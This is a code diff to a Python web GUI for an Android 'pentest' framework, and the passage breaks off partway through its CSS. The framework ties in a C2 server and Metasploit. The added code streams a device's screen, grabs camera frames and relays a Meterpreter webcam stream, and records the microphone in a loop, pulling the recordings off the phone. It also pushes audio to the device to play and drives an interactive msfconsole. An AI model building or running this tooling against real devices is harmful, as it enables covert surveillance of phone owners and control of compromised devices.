@@ -6,8 +6,8 @@ Full-featured web GUI for all android pentest operations.
 Launched via android_pentest: set mode gui; run
 Standalone: python3 android_gui.py [--port 8897] [--serial <device>]
 """
-import argparse, json, os, queue, re, shutil, subprocess, sys
-import threading, time, webbrowser
+import argparse, json, os, queue, re, shutil, struct, subprocess, sys
+import socketserver, threading, time, webbrowser
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from pathlib import Path
 from typing import Optional
@@ -21,15 +21,33 @@ _SCRIPT      = _MODULE_DIR / "android_pentest.py"
 _C2_SCRIPT   = _MODULE_DIR / "c2_gui.py"
 _PYTHON      = sys.executable
 
-_current_proc: Optional[subprocess.Popen] = None
-_c2_proc:      Optional[subprocess.Popen] = None
-_proc_lock    = threading.Lock()
-_sse_clients: list = []          # list of queue.Queue, one per SSE connection
-_sse_lock     = threading.Lock()
-_op_status    = {"running": False, "op": "", "pid": None}
-_gui_settings = {"lhost": "", "lport": "4444", "bore_server": "bore.pub",
-                 "nvd_api_key": "", "c2_host": "", "c2_port": "8889"}
-_captured_qr: list = []          # QR strings/ASCII captured from operation output
+_c2_proc:       Optional[subprocess.Popen] = None
+_sse_clients:   list = []          # list of queue.Queue, one per SSE connection
+_sse_lock       = threading.Lock()
+_gui_settings   = {"lhost": "", "lport": "4444", "bore_server": "bore.pub",
+                   "nvd_api_key": "", "c2_host": "", "c2_port": "8889"}
+_captured_qr:   list = []          # QR strings/ASCII captured from operation output
+
+# ── Multi-session pool ─────────────────────────────────────────────────────────
+_sessions:      dict = {}          # session_id → session dict
+_sessions_lock  = threading.Lock()
+_session_seq    = 0                # monotonic ID counter
+# ANSI colour codes cycled per session (32=green,36=cyan,33=yellow,35=magenta,34=blue,…)
+_SESSION_COLORS = ["32","36","33","35","34","92","96","93","95","94"]
+
+# ── Media / Meterpreter state ──────────────────────────────────────────────────
+_screen_procs: dict = {}         # serial → (adb_proc, ff_proc)
+_screen_lock  = threading.Lock()
+_cam_relay:   Optional[subprocess.Popen] = None  # proxied webcam proc
+_cam_port     = 0
+_cam_lock     = threading.Lock()
+_mic_chunks:  list = []          # [(path, ts), …]  rolling WAV recordings
+_mic_proc:    Optional[subprocess.Popen] = None
+_mic_lock     = threading.Lock()
+_msf_proc:    Optional[subprocess.Popen] = None  # interactive msfconsole
+_msf_clients: list = []          # SSE queues for MSF output
+_msf_lock     = threading.Lock()
+_msf_out_buf: list = []          # last 500 lines of MSF output
 
 # ── Broadcast helpers ──────────────────────────────────────────────────────────
 
@@ -45,38 +63,52 @@ def _broadcast(line: str):
             _sse_clients.remove(q)
 
 
-def _run_operation(context: dict):
-    global _current_proc
-    payload = json.dumps(context).encode()
-    with _proc_lock:
-        _op_status["running"] = True
-        _op_status["op"]      = context.get("params", {}).get("operation", "?")
-    _broadcast(f"\x1b[32m[+] Starting: {_op_status['op']}\x1b[0m")
+def _run_session(sid: int, context: dict):
+    """Run one android_pentest operation as an independent session."""
+    op     = context.get("params", {}).get("operation", "?")
+    device = context.get("params", {}).get("device", "")
+    color  = _SESSION_COLORS[sid % len(_SESSION_COLORS)]
+    prefix = f"\x1b[{color}m[#{sid} {op}]\x1b[0m"
+
+    with _sessions_lock:
+        _sessions[sid].update(status="running", pid=None)
+
+    _broadcast(f"{prefix} \x1b[32m[+] starting\x1b[0m")
+    status = "error"
     try:
         proc = subprocess.Popen(
             [_PYTHON, str(_SCRIPT)],
             stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT, bufsize=1,
-        )
-        with _proc_lock:
-            _current_proc = proc
-            _op_status["pid"] = proc.pid
-        proc.stdin.write(payload)
+            stderr=subprocess.STDOUT)
+        with _sessions_lock:
+            _sessions[sid]["proc"] = proc
+            _sessions[sid]["pid"]  = proc.pid
+        proc.stdin.write(json.dumps(context).encode())
         proc.stdin.close()
         for raw in iter(proc.stdout.readline, b""):
             line = raw.decode(errors="replace").rstrip("\n")
-            _broadcast(line)
+            if line.startswith("\x00RESULT\x00"):
+                json_part = line[len("\x00RESULT\x00"):]
+                _broadcast(f"__RESULT__:{json_part}")
+                with _sessions_lock:
+                    if sid in _sessions:
+                        _sessions[sid]["result"] = json_part
+                continue  # never print raw JSON blob to terminal
+            _broadcast(f"{prefix} {line}")
             _maybe_capture_qr(line)
         proc.wait()
-        _broadcast(f"\x1b[33m[*] Exit code: {proc.returncode}\x1b[0m")
+        status = "done"
+        _broadcast(f"{prefix} \x1b[33m[*] exit {proc.returncode}\x1b[0m")
     except Exception as e:
-        _broadcast(f"\x1b[31m[!] Error: {e}\x1b[0m")
+        _broadcast(f"{prefix} \x1b[31m[!] {e}\x1b[0m")
     finally:
-        with _proc_lock:
-            _current_proc = None
-            _op_status["running"] = False
-            _op_status["pid"]     = None
-        _broadcast("\x1b[35m[done]\x1b[0m")
+        with _sessions_lock:
+            if sid in _sessions:
+                _sessions[sid]["status"]  = status
+                _sessions[sid]["end_ts"]  = time.time()
+                _sessions[sid]["pid"]     = None
+                _sessions[sid]["proc"]    = None
+        _broadcast(f"\x1b[35m[done:{sid}]\x1b[0m")
 
 
 def _adb(*args) -> str:
@@ -146,8 +178,10 @@ class _Handler(BaseHTTPRequestHandler):
         p = urlparse(self.path).path
         if   p == "/" or p == "/index.html":   self._serve_html()
         elif p == "/api/devices":              self._api_devices()
+        elif p == "/api/devices/reload":       self._api_devices_reload()
         elif p == "/api/stream":               self._api_sse()
         elif p == "/api/status":               self._api_status()
+        elif p == "/api/sessions":             self._api_sessions()
         elif p == "/api/applist":              self._api_applist()
         elif p == "/api/devinfo":              self._api_devinfo()
         elif p == "/api/deps":                 self._api_deps()
@@ -158,16 +192,33 @@ class _Handler(BaseHTTPRequestHandler):
         elif p == "/api/c2/launch":            self._api_c2_launch()
         elif p == "/api/c2/stop":              self._api_c2_stop()
         elif p == "/api/c2/status":            self._api_c2_status()
+        elif p == "/api/media/screen":         self._api_screen_stream()
+        elif p == "/api/media/screen/snap":    self._api_screen_snap()
+        elif p == "/api/media/camera/snap":    self._api_camera_snap()
+        elif p == "/api/media/camera/stream":  self._api_camera_stream()
+        elif p == "/api/media/camera/list":    self._api_camera_list()
+        elif p == "/api/media/camera/stop":    self._api_camera_stop()
+        elif p == "/api/media/mic/chunk":      self._api_mic_chunk()
+        elif p == "/api/msf/stream":           self._api_msf_sse()
+        elif p == "/api/msf/sessions":         self._api_msf_sessions()
+        elif p == "/api/proc/stream":          self._api_proc_stream()
+        elif p == "/api/proc/list":            self._api_proc_list()
         else:                                  self._send(404, "text/plain", b"not found")
 
     def do_POST(self):
         p = urlparse(self.path).path
         body = self._read_body()
-        if   p == "/api/run":      self._api_run(body)
-        elif p == "/api/kill":     self._api_kill()
-        elif p == "/api/adb":      self._api_adb(body)
-        elif p == "/api/settings": self._api_settings(body)
-        else:                      self._send(404, "text/plain", b"not found")
+        if   p == "/api/run":               self._api_run(body)
+        elif p == "/api/kill":              self._api_kill()
+        elif p == "/api/adb":               self._api_adb(body)
+        elif p == "/api/settings":          self._api_settings(body)
+        elif p == "/api/media/mic/start":   self._api_mic_start(body)
+        elif p == "/api/media/mic/stop":    self._api_mic_stop()
+        elif p == "/api/media/speaker":     self._api_speaker(body)
+        elif p == "/api/msf/start":         self._api_msf_start(body)
+        elif p == "/api/msf/stop":          self._api_msf_stop()
+        elif p == "/api/msf/send":          self._api_msf_send(body)
+        else:                               self._send(404, "text/plain", b"not found")
 
     def do_OPTIONS(self):
         self.send_response(200)
@@ -207,10 +258,484 @@ class _Handler(BaseHTTPRequestHandler):
             line = line.strip()
             if not line or "offline" in line: continue
             parts = line.split()
-            if len(parts) >= 2 and parts[1] == "device":
-                info = {"serial": parts[0], "tags": " ".join(parts[2:])}
-                devs.append(info)
+            if len(parts) < 2: continue
+            serial = parts[0]
+            state  = parts[1]
+            info   = {"serial": serial, "tags": " ".join(parts[2:]), "state": state}
+            if state == "unauthorized":
+                info["label"]  = f"{serial} (tap Allow on device)"
+                info["status"] = "unauthorized"
+            elif state == "device":
+                info["status"] = "authorized"
+                # enrich with model info
+                try:
+                    raw = _adb("-s", serial, "shell",
+                               "getprop ro.product.brand; getprop ro.product.model; "
+                               "getprop ro.build.version.release; getprop ro.build.version.sdk")
+                    lines = [x.strip() for x in raw.splitlines() if x.strip()]
+                    if len(lines) >= 2:
+                        info["brand"]   = lines[0]
+                        info["model"]   = lines[1]
+                        info["android"] = lines[2] if len(lines) > 2 else ""
+                        info["sdk"]     = lines[3] if len(lines) > 3 else ""
+                        info["label"]   = f"{lines[0]} {lines[1]}"
+                except Exception:
+                    pass
+            else:
+                continue
+            devs.append(info)
         self._json({"devices": devs})
+
+    def _api_devices_reload(self):
+        """Kill and restart ADB server, wait for devices to re-enumerate, return fresh list."""
+        import time as _time
+        _adb("kill-server")
+        _time.sleep(0.6)
+        _adb("start-server")
+        # wait up to 4s for at least one device to reappear
+        for _ in range(8):
+            _time.sleep(0.5)
+            out = _adb("devices")
+            if out.count("\tdevice") > 0:
+                break
+        self._api_devices()
+
+    # ── MEDIA: Screen ─────────────────────────────────────────────────────────
+
+    def _api_screen_snap(self):
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
+        prefix = (["-s", serial] if serial else [])
+        adb    = shutil.which("adb") or "adb"
+        r = subprocess.run([adb] + prefix + ["exec-out", "screencap", "-p"],
+                           capture_output=True, timeout=5)
+        if r.returncode == 0 and r.stdout:
+            self.send_response(200)
+            self.send_header("Content-Type", "image/png")
+            self.send_header("Content-Length", str(len(r.stdout)))
+            self._cors()
+            self.end_headers()
+            self.wfile.write(r.stdout)
+        else:
+            self._json({"ok": False, "error": "screencap failed"})
+
+    def _api_screen_stream(self):
+        global _screen_procs
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
+        adb    = shutil.which("adb") or "adb"
+        ff     = shutil.which("ffmpeg")
+        prefix = (["-s", serial] if serial else [])
+
+        self.send_response(200)
+        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=secvframe")
+        self.send_header("Cache-Control", "no-cache, no-store")
+        self.send_header("Connection", "close")
+        self._cors()
+        self.end_headers()
+
+        BOUNDARY = b"--secvframe\r\nContent-Type: image/jpeg\r\n\r\n"
+
+        if ff:
+            # H.264 pipeline → ffmpeg → JPEG frames
+            try:
+                adb_p = subprocess.Popen(
+                    [adb] + prefix + ["exec-out", "screenrecord",
+                                      "--output-format=h264", "--time-limit=0", "-"],
+                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+                ff_p = subprocess.Popen(
+                    [ff, "-loglevel", "quiet", "-i", "pipe:0",
+                     "-vf", "fps=15,scale=-2:720",
+                     "-f", "image2pipe", "-vcodec", "mjpeg", "-q:v", "3", "pipe:1"],
+                    stdin=adb_p.stdout, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+                with _screen_lock:
+                    _screen_procs[serial or "__default__"] = (adb_p, ff_p)
+                buf = b""
+                while True:
+                    chunk = ff_p.stdout.read(8192)
+                    if not chunk:
+                        break
+                    buf += chunk
+                    while True:
+                        soi = buf.find(b"\xff\xd8")
+                        if soi == -1: break
+                        eoi = buf.find(b"\xff\xd9", soi + 2)
+                        if eoi == -1: break
+                        frame = buf[soi:eoi + 2]
+                        buf   = buf[eoi + 2:]
+                        try:
+                            self.wfile.write(BOUNDARY + frame + b"\r\n")
+                            self.wfile.flush()
+                        except (BrokenPipeError, ConnectionResetError):
+                            return
+            except Exception:
+                pass
+            finally:
+                for p in (adb_p, ff_p):
+                    try: p.terminate()
+                    except: pass
+                with _screen_lock:
+                    _screen_procs.pop(serial or "__default__", None)
+        else:
+            # Screencap loop fallback (PNG, ~5fps)
+            while True:
+                try:
+                    r = subprocess.run(
+                        [adb] + prefix + ["exec-out", "screencap", "-p"],
+                        capture_output=True, timeout=4)
+                    if r.returncode != 0 or not r.stdout:
+                        time.sleep(0.5)
+                        continue
+                    # PNG → serve as JPEG boundary (browsers accept PNG in MJPEG)
+                    hdr = (b"--secvframe\r\n"
+                           b"Content-Type: image/png\r\n\r\n")
+                    self.wfile.write(hdr + r.stdout + b"\r\n")
+                    self.wfile.flush()
+                    time.sleep(0.18)
+                except (BrokenPipeError, ConnectionResetError):
+                    break
+                except Exception:
+                    time.sleep(0.3)
+
+    # ── MEDIA: Camera ──────────────────────────────────────────────────────────
+
+    def _api_camera_list(self):
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
+        prefix = (["-s", serial] if serial else [])
+        adb    = shutil.which("adb") or "adb"
+        # list camera IDs via camera2 API dump
+        out = subprocess.run(
+            [adb] + prefix + ["shell", "cmd", "media.camera", "get-camera-info"],
+            capture_output=True, text=True, timeout=6).stdout
+        cameras = []
+        for line in out.splitlines():
+            if "Camera" in line and "id" in line.lower():
+                cameras.append(line.strip())
+        if not cameras:
+            # fallback: check /dev/video*
+            dev = subprocess.run(
+                [adb] + prefix + ["shell", "ls", "/dev/video*"],
+                capture_output=True, text=True, timeout=4).stdout
+            cameras = [l.strip() for l in dev.splitlines() if l.strip()]
+        self._json({"cameras": cameras or ["camera0", "camera1"]})
+
+    def _api_camera_snap(self):
+        """Single camera frame via Meterpreter webcam_snap or ADB intent."""
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
+        cam_id = (qs.get("id") or ["0"])[0]
+        prefix = (["-s", serial] if serial else [])
+        adb    = shutil.which("adb") or "adb"
+        # Use ADB screencap of camera preview via intent
+        snap_path = f"/sdcard/secv_cam_{cam_id}.jpg"
+        subprocess.run(
+            [adb] + prefix + ["shell",
+             f"am start -a android.media.action.STILL_IMAGE_CAMERA; sleep 1; screencap -p > {snap_path}"],
+            timeout=6, capture_output=True)
+        time.sleep(1.2)
+        r = subprocess.run(
+            [adb] + prefix + ["exec-out", "cat", snap_path],
+            capture_output=True, timeout=5)
+        if r.returncode == 0 and r.stdout:
+            self.send_response(200)
+            self.send_header("Content-Type", "image/png")
+            self.send_header("Content-Length", str(len(r.stdout)))
+            self._cors(); self.end_headers()
+            self.wfile.write(r.stdout)
+        else:
+            self._json({"ok": False, "error": "camera snap failed — ensure Meterpreter session active"})
+
+    def _api_camera_stream(self):
+        """Relay Meterpreter webcam MJPEG stream (started externally via webcam_stream cmd)."""
+        global _cam_relay, _cam_port
+        qs   = parse_qs(urlparse(self.path).query)
+        port = int((qs.get("port") or [str(_cam_port or 8880)])[0])
+        # proxy the local MJPEG server that meterpreter started
+        import http.client as _hc
+        try:
+            conn = _hc.HTTPConnection("127.0.0.1", port, timeout=5)
+            conn.request("GET", "/")
+            resp = conn.getresponse()
+            ct = resp.getheader("Content-Type", "multipart/x-mixed-replace; boundary=--")
+            self.send_response(200)
+            self.send_header("Content-Type", ct)
+            self.send_header("Cache-Control", "no-cache")
+            self._cors(); self.end_headers()
+            while True:
+                chunk = resp.read(4096)
+                if not chunk: break
+                try:
+                    self.wfile.write(chunk); self.wfile.flush()
+                except (BrokenPipeError, ConnectionResetError):
+                    break
+        except Exception as e:
+            self._json({"ok": False, "error": str(e),
+                        "hint": "Start webcam_stream in Meterpreter first"})
+
+    def _api_camera_stop(self):
+        global _cam_relay
+        with _cam_lock:
+            if _cam_relay:
+                try: _cam_relay.terminate()
+                except: pass
+                _cam_relay = None
+        self._json({"ok": True})
+
+    # ── MEDIA: Microphone ──────────────────────────────────────────────────────
+
+    def _api_mic_start(self, body: dict):
+        global _mic_proc, _mic_chunks
+        serial   = body.get("device", "")
+        duration = int(body.get("duration", 4))
+        lhost    = body.get("lhost") or _gui_settings.get("lhost", "")
+        lport    = int(body.get("lport", 4444))
+        prefix   = (["-s", serial] if serial else [])
+        adb      = shutil.which("adb") or "adb"
+        work_dir = Path.home() / ".secv" / "android" / "media"
+        work_dir.mkdir(parents=True, exist_ok=True)
+
+        def _record_loop():
+            global _mic_proc
+            idx = 0
+            while True:
+                with _mic_lock:
+                    if _mic_proc is None:
+                        break
+                wav = str(work_dir / f"mic_{idx:04d}.wav")
+                dev_path = f"/sdcard/secv_mic_{idx}.wav"
+                # record via ADB + Android's tinycap or toybox
+                r = subprocess.run(
+                    [adb] + prefix + ["shell",
+                     f"am startservice --user 0 -n com.android.soundrecorder/.SoundRecorderService 2>/dev/null; "
+                     f"sleep {duration}; am stopservice -n com.android.soundrecorder/.SoundRecorderService 2>/dev/null"],
+                    timeout=duration + 4, capture_output=True)
+                # fallback: pull via screenrecord audio channel isn't available — use ADB exec-out of /dev/audio
+                # simpler: use `adb shell` + `tinymix`/`tinycap` if present
+                tinycap = subprocess.run(
+                    [adb] + prefix + ["shell", f"tinycap /sdcard/secv_mic_{idx}.wav {duration} 2>/dev/null || "
+                                              f"toybox tinycap /sdcard/secv_mic_{idx}.wav {duration} 2>/dev/null"],
+                    timeout=duration + 6, capture_output=True)
+                # pull file
+                p = subprocess.run(
+                    [adb] + prefix + ["pull", dev_path, wav],
+                    capture_output=True, timeout=8)
+                if p.returncode == 0 and Path(wav).exists():
+                    with _mic_lock:
+                        _mic_chunks.append((wav, time.time()))
+                        if len(_mic_chunks) > 30:
+                            _mic_chunks.pop(0)
+                idx += 1
+                time.sleep(0.1)
+
+        with _mic_lock:
+            _mic_proc = True   # sentinel to signal running
+        t = threading.Thread(target=_record_loop, daemon=True)
+        t.start()
+        self._json({"ok": True, "msg": f"Microphone capture started ({duration}s chunks)"})
+
+    def _api_mic_stop(self):
+        global _mic_proc
+        with _mic_lock:
+            _mic_proc = None
+        self._json({"ok": True})
+
+    def _api_mic_chunk(self):
+        """Serve the latest mic recording as WAV."""
+        with _mic_lock:
+            if not _mic_chunks:
+                self._json({"ok": False, "error": "no recording yet"})
+                return
+            path, _ = _mic_chunks[-1]
+        try:
+            data = Path(path).read_bytes()
+            self.send_response(200)
+            self.send_header("Content-Type", "audio/wav")
+            self.send_header("Content-Length", str(len(data)))
+            self.send_header("Cache-Control", "no-cache")
+            self._cors(); self.end_headers()
+            self.wfile.write(data)
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)})
+
+    # ── MEDIA: Speaker ─────────────────────────────────────────────────────────
+
+    def _api_speaker(self, body: dict):
+        """Push a base64-encoded audio file to the device and play it."""
+        import base64
+        serial  = body.get("device", "")
+        b64     = body.get("data", "")
+        ext     = body.get("ext", "mp3")
+        prefix  = (["-s", serial] if serial else [])
+        adb     = shutil.which("adb") or "adb"
+        if not b64:
+            self._json({"ok": False, "error": "no audio data"}); return
+        try:
+            audio = base64.b64decode(b64)
+        except Exception:
+            self._json({"ok": False, "error": "invalid base64"}); return
+        tmp = Path("/tmp") / f"secv_spk_{int(time.time())}.{ext}"
+        tmp.write_bytes(audio)
+        dev_path = f"/sdcard/secv_spk.{ext}"
+        subprocess.run([adb] + prefix + ["push", str(tmp), dev_path],
+                       capture_output=True, timeout=10)
+        mime = "audio/mpeg" if ext == "mp3" else "audio/wav"
+        subprocess.run(
+            [adb] + prefix + ["shell",
+             f"am start -a android.intent.action.VIEW "
+             f"-d file://{dev_path} -t {mime}"],
+            capture_output=True, timeout=5)
+        self._json({"ok": True, "path": dev_path})
+
+    # ── MSF Meterpreter console ────────────────────────────────────────────────
+
+    def _api_msf_start(self, body: dict):
+        global _msf_proc, _msf_out_buf
+        if _msf_proc and _msf_proc.poll() is None:
+            self._json({"ok": True, "msg": "already running"}); return
+        msfc = shutil.which("msfconsole")
+        if not msfc:
+            self._json({"ok": False, "error": "msfconsole not found"}); return
+        _msf_out_buf = []
+        init_cmd = body.get("init", "")
+
+        def _reader():
+            global _msf_proc
+            for raw in iter(_msf_proc.stdout.readline, b""):
+                line = raw.decode(errors="replace").rstrip("\n")
+                with _msf_lock:
+                    _msf_out_buf.append(line)
+                    if len(_msf_out_buf) > 500:
+                        _msf_out_buf.pop(0)
+                    for q in list(_msf_clients):
+                        try: q.put_nowait(line)
+                        except queue.Full: pass
+
+        _msf_proc = subprocess.Popen(
+            [msfc, "-q"],
+            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT)
+        threading.Thread(target=_reader, daemon=True).start()
+        if init_cmd:
+            time.sleep(2)
+            try:
+                _msf_proc.stdin.write((init_cmd + "\n").encode())
+                _msf_proc.stdin.flush()
+            except Exception: pass
+        self._json({"ok": True})
+
+    def _api_msf_stop(self):
+        global _msf_proc
+        if _msf_proc:
+            try: _msf_proc.terminate()
+            except: pass
+            _msf_proc = None
+        self._json({"ok": True})
+
+    def _api_msf_send(self, body: dict):
+        global _msf_proc
+        cmd = body.get("cmd", "")
+        if not _msf_proc or _msf_proc.poll() is not None:
+            self._json({"ok": False, "error": "msfconsole not running"}); return
+        try:
+            _msf_proc.stdin.write((cmd + "\n").encode())
+            _msf_proc.stdin.flush()
+            self._json({"ok": True})
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)})
+
+    def _api_msf_sse(self):
+        q = queue.Queue(maxsize=500)
+        with _msf_lock:
+            _msf_clients.append(q)
+            history = list(_msf_out_buf)
+        self.send_response(200)
+        self.send_header("Content-Type", "text/event-stream")
+        self.send_header("Cache-Control", "no-cache")
+        self.send_header("Connection", "keep-alive")
+        self._cors(); self.end_headers()
+        try:
+            # replay history
+            for line in history:
+                self.wfile.write(f"data: {line}\n\n".encode()); self.wfile.flush()
+            while True:
+                try:
+                    line = q.get(timeout=15)
+                    self.wfile.write(f"data: {line}\n\n".encode()); self.wfile.flush()
+                except queue.Empty:
+                    self.wfile.write(b": ping\n\n"); self.wfile.flush()
+        except (BrokenPipeError, ConnectionResetError):
+            pass
+        finally:
+            with _msf_lock:
+                try: _msf_clients.remove(q)
+                except ValueError: pass
+
+    def _api_msf_sessions(self):
+        global _msf_out_buf
+        with _msf_lock:
+            buf = "\n".join(_msf_out_buf[-100:])
+        sessions = []
+        for line in buf.splitlines():
+            if "Meterpreter" in line or "meterpreter" in line:
+                sessions.append(line.strip())
+        self._json({"sessions": sessions, "running": bool(_msf_proc and _msf_proc.poll() is None)})
+
+    # ── proc stream ───────────────────────────────────────────────────────────
+
+    def _api_proc_list(self):
+        """One-shot JSON process list for the current device."""
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
+        filt   = (qs.get("filter") or [""])[0].lower()
+        prefix = ["-s", serial] if serial else []
+        out    = _adb(*prefix, "shell", "ps", "-A", "2>/dev/null")
+        procs  = []
+        for line in out.splitlines():
+            parts = line.split()
+            if len(parts) < 9 or parts[0] == "USER":
+                continue
+            name = parts[-1]
+            if filt and filt not in name.lower() and filt not in parts[1]:
+                continue
+            procs.append({"user": parts[0], "pid": parts[1],
+                          "ppid": parts[2], "state": parts[7] if len(parts) > 7 else "?",
+                          "name": name})
+        self._json({"procs": procs, "total": len(procs)})
+
+    def _api_proc_stream(self):
+        """SSE stream — pushes updated process list every 2 s."""
+        qs     = parse_qs(urlparse(self.path).query)
+        serial = (qs.get("serial") or [""])[0]
+        filt   = (qs.get("filter") or [""])[0].lower()
+        prefix = ["-s", serial] if serial else []
+        self.send_response(200)
+        self.send_header("Content-Type", "text/event-stream; charset=utf-8")
+        self.send_header("Cache-Control", "no-cache")
+        self._cors()
+        self.end_headers()
+        try:
+            while True:
+                out   = _adb(*prefix, "shell", "ps", "-A", "2>/dev/null")
+                procs = []
+                for line in out.splitlines():
+                    parts = line.split()
+                    if len(parts) < 9 or parts[0] == "USER":
+                        continue
+                    name = parts[-1]
+                    if filt and filt not in name.lower() and filt not in parts[1]:
+                        continue
+                    procs.append({"user": parts[0], "pid": parts[1],
+                                  "ppid": parts[2], "state": parts[7] if len(parts) > 7 else "?",
+                                  "name": name})
+                payload = json.dumps({"procs": procs, "ts": time.time()})
+                self.wfile.write(f"data: {payload}\n\n".encode())
+                self.wfile.flush()
+                time.sleep(2)
+        except (BrokenPipeError, ConnectionResetError):
+            pass
+
+    # ── devinfo ────────────────────────────────────────────────────────────────
 
     def _api_devinfo(self):
         qs     = parse_qs(urlparse(self.path).query)
@@ -232,26 +757,67 @@ class _Handler(BaseHTTPRequestHandler):
         self._json({"packages": packages})
 
     def _api_status(self):
-        with _proc_lock:
-            self._json(dict(_op_status))
+        with _sessions_lock:
+            running = [s for s in _sessions.values() if s["status"] == "running"]
+        self._json({
+            "running":  len(running) > 0,
+            "count":    len(running),
+            "op":       ", ".join(s["op"] for s in running) if running else "",
+            "pid":      running[0]["pid"] if len(running) == 1 else None,
+            "sessions": [{"id": s["id"], "op": s["op"],
+                          "device": s.get("device", ""), "pid": s["pid"]}
+                         for s in running],
+        })
+
+    def _api_sessions(self):
+        now = time.time()
+        with _sessions_lock:
+            rows = [{
+                "id":      s["id"],
+                "op":      s["op"],
+                "device":  s.get("device", ""),
+                "status":  s["status"],
+                "pid":     s["pid"],
+                "elapsed": round((s.get("end_ts") or now) - s["start_ts"], 1),
+                "color":   _SESSION_COLORS[s["id"] % len(_SESSION_COLORS)],
+            } for s in _sessions.values()]
+        self._json({"sessions": rows})
 
     def _api_run(self, body: dict):
-        if _op_status["running"]:
-            self._json({"ok": False, "error": "operation already running"})
-            return
-        threading.Thread(target=_run_operation, args=(body,), daemon=True).start()
-        self._json({"ok": True})
+        global _session_seq
+        with _sessions_lock:
+            _session_seq += 1
+            sid = _session_seq
+            _sessions[sid] = {
+                "id":       sid,
+                "op":       body.get("params", {}).get("operation", "?"),
+                "device":   body.get("params", {}).get("device", ""),
+                "start_ts": time.time(),
+                "end_ts":   None,
+                "status":   "starting",
+                "pid":      None,
+                "proc":     None,
+            }
+        threading.Thread(target=_run_session, args=(sid, body), daemon=True).start()
+        self._json({"ok": True, "session_id": sid})
 
     def _api_kill(self):
-        with _proc_lock:
-            p = _current_proc
-        if p:
-            try:
-                p.terminate()
-                _broadcast("\x1b[31m[!] Operation killed\x1b[0m")
-            except Exception as e:
-                _broadcast(f"\x1b[31m[!] Kill failed: {e}\x1b[0m")
-        self._json({"ok": True})
+        qs  = parse_qs(urlparse(self.path).query)
+        sid = int((qs.get("session") or ["0"])[0])
+        killed = []
+        with _sessions_lock:
+            targets = ([_sessions[sid]] if sid and sid in _sessions
+                       else [s for s in _sessions.values() if s["status"] == "running"])
+        for s in targets:
+            p = s.get("proc")
+            if p and p.poll() is None:
+                try:
+                    p.terminate()
+                    killed.append(s["id"])
+                    _broadcast(f"\x1b[31m[!] Session #{s['id']} ({s['op']}) killed\x1b[0m")
+                except Exception as e:
+                    _broadcast(f"\x1b[31m[!] Kill #{s['id']} failed: {e}\x1b[0m")
+        self._json({"ok": True, "killed": killed})
 
     def _api_adb(self, body: dict):
         args = body.get("args", [])
@@ -422,6 +988,83 @@ a{color:var(--blue);text-decoration:none;}
 ::-webkit-scrollbar-track{background:var(--bg);}
 ::-webkit-scrollbar-thumb{background:var(--bg4);}
 
+/* SESSIONS BAR */
+#sessions-bar{
+  display:none;align-items:center;gap:6px;padding:4px 16px;
+  background:var(--bg1);border-bottom:1px solid var(--border);
+  flex-shrink:0;overflow-x:auto;
+}
+#sessions-bar.visible{display:flex;}
+#sess-label{font-size:0.55rem;letter-spacing:0.14em;text-transform:uppercase;
+  color:var(--muted);flex-shrink:0;margin-right:4px;}
+.sess-pill{
+  display:flex;align-items:center;gap:5px;
+  border:1px solid var(--border2);padding:2px 8px 2px 6px;
+  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.04em;
+  white-space:nowrap;transition:border-color var(--t);
+}
+.sess-pill:hover{border-color:var(--border3);}
+.sess-pill .sp-dot{width:5px;height:5px;flex-shrink:0;}
+.sess-pill .sp-dot.running{animation:pulse .8s infinite;}
+.sess-pill .sp-label{color:var(--white);}
+.sess-pill .sp-dev{color:var(--muted);font-size:0.54rem;margin-left:1px;}
+.sess-pill .sp-time{color:var(--muted);font-size:0.54rem;margin-left:2px;}
+.sess-pill .sp-kill{
+  background:none;border:none;cursor:pointer;
+  color:var(--muted);font-size:0.62rem;padding:0 0 0 4px;
+  line-height:1;transition:color var(--t);
+}
+.sess-pill .sp-kill:hover{color:var(--red);}
+.sess-pill.done   .sp-dot{background:var(--muted);}
+.sess-pill.error  .sp-dot{background:var(--red);}
+.sess-pill.done   .sp-label{color:var(--muted);}
+.sess-pill.error  .sp-label{color:var(--red);}
+#sess-count{
+  font-size:0.58rem;color:var(--muted);flex-shrink:0;margin-left:auto;
+  letter-spacing:0.06em;
+}
+
+/* PROCESS SNIFFER PANEL */
+#proc-sniff-panel{
+  display:none; flex-direction:column; gap:6px; margin-top:10px;
+  border:1px solid var(--border2); background:var(--bg1); padding:10px;
+}
+#proc-sniff-panel.visible{display:flex;}
+#proc-sniff-panel .ps-toolbar{display:flex;align-items:center;gap:8px;}
+#proc-sniff-panel .ps-filter{
+  flex:1;background:var(--bg2);border:1px solid var(--border);color:var(--text);
+  font-family:var(--mono);font-size:0.7rem;padding:4px 7px;outline:none;
+}
+#proc-sniff-panel .ps-filter:focus{border-color:var(--green);}
+#proc-sniff-panel .ps-btn{
+  font-family:var(--mono);font-size:0.64rem;letter-spacing:0.06em;padding:4px 10px;
+  border:1px solid var(--border2);background:var(--bg2);color:var(--text);cursor:pointer;
+}
+#proc-sniff-panel .ps-btn.active{border-color:var(--green);color:var(--green);}
+#proc-sniff-panel .ps-btn:hover{border-color:var(--white);color:var(--white);}
+#proc-sniff-panel .ps-count{font-size:0.6rem;color:var(--muted);margin-left:auto;}
+#proc-table{
+  width:100%;border-collapse:collapse;font-family:var(--mono);font-size:0.64rem;
+  max-height:220px;overflow-y:auto;display:block;
+}
+#proc-table thead{position:sticky;top:0;background:var(--bg2);}
+#proc-table th{
+  text-align:left;padding:3px 8px;color:var(--muted);letter-spacing:0.06em;
+  border-bottom:1px solid var(--border2);font-weight:400;white-space:nowrap;
+}
+#proc-table td{
